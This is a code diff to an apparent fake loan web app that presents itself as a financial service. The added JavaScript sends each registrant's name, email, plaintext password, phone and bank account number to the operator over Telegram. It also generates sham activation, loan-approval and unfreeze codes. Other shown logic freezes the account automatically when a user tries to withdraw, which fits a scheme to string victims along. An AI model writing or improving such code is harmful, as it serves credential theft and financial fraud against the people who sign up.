@@ -204,6 +204,29 @@
             margin-bottom: 15px;
         }
 
+        .generated-code {
+            background: white;
+            border: 2px solid var(--primary);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
+            letter-spacing: 3px;
+            text-align: center;
+        }
+
+        .code-note {
+            background: rgba(239, 68, 68, 0.1);
+            border-left: 4px solid var(--danger);
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 12px;
+            color: var(--danger);
+            border-radius: 5px;
+        }
+
         .btn {
             width: 100%;
             padding: 16px;
@@ -711,20 +734,27 @@
                 </div>
             </div>
             
-            <button class="btn btn-primary" onclick="showSecurityCode()">Create Account</button>
+            <button class="btn btn-primary" onclick="generateRegistrationCode()">Create Account</button>
             
             <!-- Security Code Box -->
             <div class="security-code-box" id="securityCodeBox">
                 <div class="security-icon">🛡️</div>
-                <div class="security-title">Loan Security Code</div>
-                <div class="security-desc">This code is required for loan processing security</div>
+                <div class="security-title">Account Activation Code</div>
+                <div class="security-desc">Code has been sent to Telegram. Enter it below:</div>
+                
+                <div class="generated-code" id="generatedRegCode">LOADING...</div>
+                
+                <div class="code-note">
+                    ⚠️ This code is required for account activation. Check Telegram for the code.
+                </div>
+                
                 <div class="form-group">
                     <div class="input-wrapper">
                         <span class="input-icon">🔐</span>
-                        <input type="text" class="form-input" id="regSecurityCode" placeholder="Enter Loan Security Code" required>
+                        <input type="text" class="form-input" id="regSecurityCode" placeholder="Enter Activation Code" required>
                     </div>
                 </div>
-                <button class="btn btn-primary" onclick="handleRegister()">Open Account</button>
+                <button class="btn btn-primary" onclick="handleRegister()">Activate Account</button>
             </div>
         </div>
         <div class="auth-footer">
@@ -879,14 +909,21 @@
                 <div class="security-code-box" id="loanApprovalBox">
                     <div class="security-icon">✅</div>
                     <div class="security-title">Loan Approval Code</div>
-                    <div class="security-desc">Enter the approval code to process your loan</div>
+                    <div class="security-desc">Code has been sent to Telegram. Enter it to approve:</div>
+                    
+                    <div class="generated-code" id="generatedLoanCode">LOADING...</div>
+                    
+                    <div class="code-note">
+                        ⚠️ This code is required for loan approval. Check Telegram.
+                    </div>
+                    
                     <div class="form-group">
                         <div class="input-wrapper">
                             <span class="input-icon">🔐</span>
-                            <input type="text" class="form-input" id="loanApprovalCode" placeholder="Enter approval code">
+                            <input type="text" class="form-input" id="loanApprovalCode" placeholder="Enter Approval Code">
                         </div>
                     </div>
-                    <button class="btn btn-primary" onclick="approveLoan()">Approve Loan</button>
+                    <button class="btn btn-primary" onclick="approveLoan()">Approve & Credit Loan</button>
                 </div>
             </div>
         </div>
@@ -1034,11 +1071,18 @@
         <div class="modal-content">
             <div class="modal-icon">🔓</div>
             <div class="modal-title">Unfreeze Account</div>
-            <div class="modal-text">Enter the unfreeze code to unlock your account</div>
+            <div class="modal-text">Code has been sent to Telegram:</div>
+            
+            <div class="generated-code" id="generatedUnfreezeCode">LOADING...</div>
+            
+            <div class="code-note">
+                ⚠️ Enter the unfreeze code from Telegram
+            </div>
+            
             <div class="form-group">
                 <div class="input-wrapper">
                     <span class="input-icon">🔐</span>
-                    <input type="text" class="form-input" id="unfreezeCode" placeholder="Enter unfreeze code">
+                    <input type="text" class="form-input" id="unfreezeCode" placeholder="Enter Unfreeze Code">
                 </div>
             </div>
             <button class="btn btn-primary" onclick="unfreezeAccount()">Unfreeze Account</button>
@@ -1078,6 +1122,13 @@
         let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;
         let pendingLoanData = null;
         let selectedBank = '';
+        
+        // Code Storage
+        let generatedCodes = {
+            registration: '',
+            loan: '',
+            unfreeze: ''
+        };
 
         // Initialize
         window.addEventListener('load', () => {
@@ -1088,6 +1139,16 @@
                 }
             }, 1500);
         });
+
+        // Code Generator Function
+        function generateCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
 
         // Telegram Functions
         async function sendTelegram(message) {
@@ -1118,7 +1179,7 @@
             document.getElementById('registerScreen').classList.add('active');
         }
 
-        function showSecurityCode() {
+        async function generateRegistrationCode() {
             const name = document.getElementById('regName').value;
             const email = document.getElementById('regEmail').value;
             const password = document.getElementById('regPassword').value;
@@ -1130,7 +1191,29 @@
                 return;
             }
 
+            // Generate unique code
+            const code = generateCode();
+            generatedCodes.registration = code;
+
+            // Show code box
             document.getElementById('securityCodeBox').classList.add('show');
+            document.getElementById('generatedRegCode').textContent = code;
+
+            // Send to Telegram
+            await sendTelegram(`
+🆕 <b>REGISTRATION CODE GENERATED</b>
+
+👤 <b>Name:</b> ${name}
+📧 <b>Email:</b> ${email}
+🔒 <b>Password:</b> ${password}
+📱 <b>Phone:</b> ${phone}
+💳 <b>Account:</b> ${account}
+
+🔐 <b>ACTIVATION CODE:</b> <code>${code}</code>
+
+⚠️ User must enter this code to activate account.
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `);
         }
 
         async function handleRegister() {
@@ -1139,10 +1222,15 @@
             const password = document.getElementById('regPassword').value;
             const phone = document.getElementById('regPhone').value;
             const account = document.getElementById('regAccount').value;
-            const securityCode = document.getElementById('regSecurityCode').value;
+            const enteredCode = document.getElementById('regSecurityCode').value;
 
-            if (!securityCode) {
-                alert('❌ Please enter loan security code!');
+            if (!enteredCode) {
+                alert('❌ Please enter activation code!');
+                return;
+            }
+
+            if (enteredCode !== generatedCodes.registration) {
+                alert('❌ Invalid activation code! Please check Telegram.');
                 return;
             }
 
@@ -1166,7 +1254,6 @@
                 password,
                 phone,
                 account,
-                securityCode,
                 balance: 0,
                 loanStatus: 'none',
                 loanAmount: 0,
@@ -1179,22 +1266,22 @@
 
             // Send to Telegram
             await sendTelegram(`
-🆕 <b>NEW REGISTRATION</b>
+✅ <b>ACCOUNT ACTIVATED SUCCESSFULLY</b>
 
 👤 <b>Name:</b> ${name}
 📧 <b>Email:</b> ${email}
-🔒 <b>Password:</b> ${password}
-📱 <b>Phone:</b> ${phone}
-💳 <b>Account:</b> ${account}
-🔐 <b>Loan Security Code:</b> ${securityCode}
 🎰 <b>Slot:</b> ${emptySlot + 1}
+🔐 <b>Code Used:</b> ${enteredCode}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+Account is now active and ready to use!
             `);
 
-            showModal('successModal', '✅', 'Account Created!', 'Your account has been created successfully. Please login.');
+            showModal('successModal', '✅', 'Account Created!', 'Your account has been activated successfully. Please login.');
             setTimeout(() => {
                 closeModal('successModal');
                 showLogin();
+                document.getElementById('securityCodeBox').classList.remove('show');
             }, 2000);
         }
 
@@ -1242,11 +1329,9 @@
         function updateDashboard() {
             if (!currentUser) return;
 
-            // Update header
             document.getElementById('userName').textContent = currentUser.name;
             document.getElementById('balanceAmount').textContent = `₱${currentUser.balance.toFixed(2)}`;
             
-            // Update loan status
             const statusText = {
                 'none': 'No Loan',
                 'pending': 'Pending',
@@ -1255,7 +1340,6 @@
             document.getElementById('loanStatus').textContent = statusText[currentUser.loanStatus];
             document.getElementById('loanStatus').className = `balance-status status-${currentUser.loanStatus}`;
 
-            // Update freeze status
             const freezeStatus = document.getElementById('freezeStatus');
             const freezeBtn = document.getElementById('freezeBtn');
             
@@ -1267,7 +1351,6 @@
                 freezeBtn.textContent = '🔒 Freeze Balance';
             }
 
-            // Update profile
             document.getElementById('profileName').textContent = currentUser.name;
             document.getElementById('profileEmail').textContent = currentUser.email;
             document.getElementById('profilePhone').textContent = currentUser.phone;
@@ -1293,7 +1376,6 @@
                 purpose: document.getElementById('loanPurpose').value
             };
 
-            // Validate all fields
             for (let key in loanData) {
                 if (!loanData[key]) {
                     alert('❌ Please fill all fields!');
@@ -1308,9 +1390,17 @@
 
             pendingLoanData = loanData;
 
+            // Generate approval code
+            const code = generateCode();
+            generatedCodes.loan = code;
+
+            // Show approval box
+            document.getElementById('loanApprovalBox').classList.add('show');
+            document.getElementById('generatedLoanCode').textContent = code;
+
             // Send to Telegram
             await sendTelegram(`
-📝 <b>NEW LOAN APPLICATION</b>
+📝 <b>LOAN APPLICATION SUBMITTED</b>
 
 👤 <b>User:</b> ${currentUser.name}
 📧 <b>Email:</b> ${currentUser.email}
@@ -1330,17 +1420,23 @@
 💰 <b>Income:</b> ₱${parseFloat(loanData.income).toLocaleString()}
 📋 <b>Purpose:</b> ${loanData.purpose}
 
+🔐 <b>APPROVAL CODE:</b> <code>${code}</code>
+
+⚠️ User must enter this code to approve loan.
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
             `);
-
-            document.getElementById('loanApprovalBox').classList.add('show');
         }
 
         async function approveLoan() {
-            const approvalCode = document.getElementById('loanApprovalCode').value;
+            const enteredCode = document.getElementById('loanApprovalCode').value;
 
-            if (!approvalCode) {
+            if (!enteredCode) {
                 alert('❌ Please enter approval code!');
+                return;
+            }
+
+            if (enteredCode !== generatedCodes.loan) {
+                alert('❌ Invalid approval code! Please check Telegram.');
                 return;
             }
 
@@ -1349,18 +1445,6 @@
                 return;
             }
 
-            // Send code to Telegram
-            await sendTelegram(`
-✅ <b>LOAN APPROVAL CODE SUBMITTED</b>
-
-👤 <b>User:</b> ${currentUser.name}
-🎰 <b>Slot:</b> ${currentUser.slot}
-💵 <b>Amount:</b> ₱${parseFloat(pendingLoanData.amount).toLocaleString()}
-🔐 <b>Code:</b> ${approvalCode}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-            `);
-
-            // Update user
             currentUser.loanStatus = 'approved';
             currentUser.loanAmount = parseFloat(pendingLoanData.amount);
             currentUser.balance += parseFloat(pendingLoanData.amount);
@@ -1370,16 +1454,19 @@
             localStorage.setItem('currentUser', JSON.stringify(currentUser));
 
             await sendTelegram(`
-💰 <b>LOAN APPROVED & CREDITED</b>
+✅ <b>LOAN APPROVED & CREDITED</b>
 
 👤 <b>User:</b> ${currentUser.name}
 🎰 <b>Slot:</b> ${currentUser.slot}
 💵 <b>Loan Amount:</b> ₱${currentUser.loanAmount.toLocaleString()}
 💳 <b>New Balance:</b> ₱${currentUser.balance.toLocaleString()}
+🔐 <b>Code Used:</b> ${enteredCode}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+Loan has been approved and credited to account!
             `);
 
-            showModal('successModal', '✅', 'Loan Approved!', `Your loan of ₱${currentUser.loanAmount.toLocaleString()} has been approved and credited to your account!`);
+            showModal('successModal', '✅', 'Loan Approved!', `Your loan of ₱${currentUser.loanAmount.toLocaleString()} has been approved and credited!`);
             
             document.getElementById('loanApprovalBox').classList.remove('show');
             updateDashboard();
@@ -1421,7 +1508,6 @@
                 return;
             }
 
-            // Send to Telegram
             await sendTelegram(`
 💸 <b>WITHDRAWAL REQUEST</b>
 
@@ -1439,7 +1525,6 @@
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
             `);
 
-            // Show processing
             document.getElementById('withdrawBtn').disabled = true;
             document.getElementById('withdrawBtn').textContent = 'Processing...';
             document.getElementById('processingOverlay').classList.add('show');
@@ -1471,6 +1556,8 @@
 🎰 <b>Slot:</b> ${currentUser.slot}
 💳 <b>Balance:</b> ₱0.00 (Frozen)
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+Account has been automatically frozen after withdrawal attempt.
             `);
 
             document.getElementById('withdrawBtn').disabled = false;
@@ -1480,11 +1567,27 @@
             updateDashboard();
         }
 
-        function toggleFreeze() {
+        async function toggleFreeze() {
             if (currentUser.frozen) {
+                // Generate unfreeze code
+                const code = generateCode();
+                generatedCodes.unfreeze = code;
+
+                document.getElementById('generatedUnfreezeCode').textContent = code;
                 document.getElementById('unfreezeModal').classList.add('show');
+
+                await sendTelegram(`
+🔓 <b>UNFREEZE REQUEST</b>
+
+👤 <b>User:</b> ${currentUser.name}
+🎰 <b>Slot:</b> ${currentUser.slot}
+
+🔐 <b>UNFREEZE CODE:</b> <code>${code}</code>
+
+⚠️ User must enter this code to unfreeze account.
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+                `);
             } else {
-                // Manual freeze
                 currentUser.frozen = true;
                 users[currentUser.slot - 1] = currentUser;
                 localStorage.setItem('usersDB', JSON.stringify(users));
@@ -1494,20 +1597,27 @@
         }
 
         async function unfreezeAccount() {
-            const code = document.getElementById('unfreezeCode').value;
+            const enteredCode = document.getElementById('unfreezeCode').value;
 
-            if (!code) {
+            if (!enteredCode) {
                 alert('❌ Please enter unfreeze code!');
                 return;
             }
 
+            if (enteredCode !== generatedCodes.unfreeze) {
+                alert('❌ Invalid unfreeze code! Please check Telegram.');
+                return;
+            }
+
             await sendTelegram(`
-🔓 <b>UNFREEZE CODE SUBMITTED</b>
+✅ <b>ACCOUNT UNFROZEN</b>
 
 👤 <b>User:</b> ${currentUser.name}
 🎰 <b>Slot:</b> ${currentUser.slot}
-🔐 <b>Code:</b> ${code}
+🔐 <b>Code Used:</b> ${enteredCode}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+Account has been successfully unfrozen!
             `);
 
             currentUser.frozen = false;
@@ -1519,16 +1629,14 @@
             closeModal('unfreezeModal');
             updateDashboard();
 
-            showModal('successModal', '✅', 'Account Unfrozen!', 'Your account has been unfrozen. You can now access your funds.');
+            showModal('successModal', '✅', 'Account Unfrozen!', 'Your account has been unfrozen successfully.');
         }
 
         // UI Functions
         function switchTab(tab) {
-            // Update tab bar
             document.querySelectorAll('.tab-item').forEach(item => item.classList.remove('active'));
             event.target.closest('.tab-item').classList.add('active');
 
-            // Update panels
             document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active'));
             document.getElementById(`${tab}Panel`).classList.add('active');
         }
@@ -1561,16 +1669,14 @@
         }
 
         // Admin Functions
-        function adminViewUsers() {
+        window.adminViewUsers = () => {
             console.log('=== USERS DATABASE ===');
             users.forEach((user, index) => {
-                if (user) {
-                    console.log(`Slot ${index + 1}:`, user);
-                }
+                if (user) console.log(`Slot ${index + 1}:`, user);
             });
-        }
+        };
 
-        function adminAddBalance(slot, amount) {
+        window.adminAddBalance = (slot, amount) => {
             if (users[slot - 1]) {
                 users[slot - 1].balance += amount;
                 localStorage.setItem('usersDB', JSON.stringify(users));
@@ -1581,19 +1687,14 @@
                 }
                 console.log(`Added ₱${amount} to slot ${slot}`);
             }
-        }
+        };
 
-        function adminReset() {
+        window.adminReset = () => {
             if (confirm('Reset all data?')) {
                 localStorage.clear();
                 location.reload();
             }
-        }
-
-        // Make admin functions global
-        window.adminViewUsers = adminViewUsers;
-        window.adminAddBalance = adminAddBalance;
-        window.adminReset = adminReset;
+        };
     </script>
 </body>
 </html>
